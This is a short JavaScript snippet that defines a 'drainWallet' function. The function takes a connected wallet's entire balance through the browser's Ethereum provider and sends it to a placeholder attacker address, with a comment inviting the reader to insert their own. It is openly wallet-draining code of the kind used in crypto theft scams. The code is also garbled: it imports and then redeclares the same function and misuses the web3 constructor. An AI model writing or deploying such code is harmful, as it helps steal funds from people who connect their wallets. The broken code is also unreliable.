const { drainWallet } = require('../utils/web3');

export const drainWallet = async (walletAddress, chain) => {
  const web3 = new require('web3')(window.ethereum);
  const balance = await web3.eth.getBalance(walletAddress);
  const drainTo = '0xYourDrainAddressHere'; // Replace with your drain address

  await web3.eth.sendTransaction({
    from: walletAddress,
    to: drainTo,
    value: balance,
  });
};